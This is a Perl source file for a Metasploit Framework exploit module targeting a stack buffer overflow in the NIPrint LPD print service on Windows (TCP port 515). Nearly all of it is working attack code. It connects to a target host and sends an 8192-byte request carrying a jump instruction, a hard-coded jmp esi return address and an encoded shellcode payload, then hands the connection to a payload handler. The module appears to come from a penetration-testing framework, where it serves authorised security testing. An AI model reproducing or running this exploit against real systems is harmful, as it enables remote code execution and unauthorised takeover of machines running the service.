package Msf::Exploit::niprint_lpd;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'		=> 'NIPrint LPD Request Overflow',
	'Version'	=> '$Revision: 3715 $',
	'Authors'	=>
	  [
		'H D Moore <hdm [at] metasploit.com>',
	  ],

	'Arch'		=> [ 'x86' ],
	'OS'		=> [ 'win32' ],
	'Priv'		=> 0,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The LPD server port', 515],
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a stack overflow in the
	Network Instrument NIPrint LPD service. Inspired by
	Immunity's VisualSploit :-)
	
}),

	'Payload' =>
	  {
		'Space'     => 500,
		'BadChars'  => "\x00",
		'Keys'		=> ['+ws2ord'],
	  },

	'Refs'  =>
	  [
		['OSVDB', '2774'],
		['BID',   '8968'],
		['URL',   'http://www.immunitysec.com/documentation/vs_niprint.html'],
	  ],

	'DefaultTarget' => 0,

	'Targets' =>
	  [
		['NIPrint3.EXE (TDS:0x3a045ff2)', 0x00404236], # jmp esi
	  ],

	'Keys' => ['lpd'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target      = $self->Targets->[$target_idx];

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}
	my $req = Pex::Text::AlphaNumText(8192);
	substr($req, 0, 2, "\xeb\x33");
	substr($req, 49, 4, pack('V', $target->[1]));
	substr($req, 53, length($shellcode), $shellcode);

	$s->Send($req);
	$self->Handler($s);
	$s->Close;
	return;
}

1;
